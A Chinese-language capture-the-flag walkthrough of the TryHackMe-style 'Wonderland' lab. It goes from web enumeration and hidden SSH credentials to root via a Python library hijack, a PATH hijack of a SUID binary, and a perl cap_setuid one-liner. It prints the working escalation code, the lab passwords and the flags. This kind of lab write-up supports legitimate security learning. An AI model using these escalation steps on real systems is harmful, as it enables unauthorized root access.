# Wonderland

进入仙境并夺取旗帜

循例，nmap扫一波

只开了22和80

先进web查看一下,gobuster也扫一波目录

查看源代码有个/img文件夹，里面有三张图片

gobuster扫到：

<pre>/img                 <font color="#49AEE6"> (Status: 301)</font> [Size: 0]<font color="#367BF0"> [--&gt; img/]</font>
/index.html          <font color="#49AEE6"> (Status: 301)</font> [Size: 0]<font color="#367BF0"> [--&gt; ./]</font>
/r                   <font color="#49AEE6"> (Status: 301)</font> [Size: 0]<font color="#367BF0"> [--&gt; r/]</font>
</pre>

/r页面：

    Keep Going.

    "Would you tell me, please, which way I ought to go from here?"

对着/r/再扫一波子目录

扫出/r/a

与/r页面一样的内容，继续这样扫

直到/r/a/b/b/i/t/

查看源代码：

     <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>

尝试登录ssh：

<pre><font color="#47D4B9"><b>alice@wonderland</b></font>:<font color="#277FFF"><b>~</b></font>$ </pre>

成功登录

ls -la发现有个root.txt但没权限，刚刚在web扫描过程中有提到这么一句话：

    这里的一切都是颠倒的

<pre><font color="#47D4B9"><b>alice@wonderland</b></font>:<font color="#277FFF"><b>~</b></font>$ cat /root/user.txt
thm{&quot;Curiouser and curiouser!&quot;}
</pre>

sudo -l发现可以以rabbit运行一个python脚本：

    import random
    random.choice(arg)

我们可以修改python path

    export PYTHONPATH=/home/alice:$PYTHONPATH

在/home/alice创建random.py

    def choice(arg):
        import os
        os.system('/bin/bash')

<pre><font color="#47D4B9"><b>alice@wonderland</b></font>:<font color="#277FFF"><b>~</b></font>$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
<font color="#47D4B9"><b>rabbit@wonderland</b></font>:<font color="#277FFF"><b>~</b></font>$ 
</pre>

进到rabbit，查看getcap 看到了好东西：

<pre><font color="#47D4B9"><b>rabbit@wonderland</b></font>:<font color="#277FFF"><b>/home/rabbit</b></font>$ getcap -r / 2&gt;/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
</pre>

遗憾的是，权限不足

/home/rabbit下有一个可执行文件，并且被设了suid , strings查看一下，发现这么一行代码：

    /bin/echo -n 'Probably by ' && date --date='next hour' -R

它会执行date命令

所以我们在/home/rabbit创建date并写入命令：

    #!/bin/bash
    /bin/bash

修改PATH

    export PATH=/home/rabbit:$PATH

    chmod 777 ./date

再次运行./teaParty

<pre><font color="#47D4B9"><b>rabbit@wonderland</b></font>:<font color="#277FFF"><b>/home/rabbit</b></font>$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by
<font color="#47D4B9"><b>hatter@wonderland</b></font>:<font color="#277FFF"><b>/home/rabbit</b></font>$ whoami
hatter
</pre>

在hatter下查看

<pre><font color="#47D4B9"><b>hatter@wonderland</b></font>:<font color="#277FFF"><b>/home/hatter</b></font>$ getcap -r / 2&gt;/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
<font color="#47D4B9"><b>hatter@wonderland</b></font>:<font color="#277FFF"><b>/home/hatter</b></font>$ ls -la /usr/bin |grep perl
-rwxr-xr--  2 root   <font color="#EC0101">hatter</font>   2097720 Nov 19  2018 <font color="#EC0101"><b>perl</b></font>
-rwxr-xr--  2 root   <font color="#EC0101">hatter</font>   2097720 Nov 19  2018 <font color="#EC0101"><b>perl</b></font>5.26.1
</pre>

#### 注意，由于我们不是正常登录过来的，所以我们的gid并不是hatter所属的

我们在/home/hatter下发现了password.txt：

    WhyIsARavenLikeAWritingDesk?

有可能是hatter的密码

尝试ssh登录

成功

翻看[垃圾桶](https://gtfobins.github.io/gtfobins/perl/)

使用具有capabilities的perl设置uid为0并就此获得bash

<pre><font color="#47D4B9"><b>hatter@wonderland</b></font>:<font color="#277FFF"><b>~</b></font>$ perl -e &apos;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/bash&quot;;&apos;
</pre>

<pre><font color="#47D4B9"><b>root@wonderland</b></font>:<font color="#277FFF"><b>~</b></font># whoami
root
<font color="#47D4B9"><b>root@wonderland</b></font>:<font color="#277FFF"><b>~</b></font># cat /home/alice/root.txt
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
</pre>
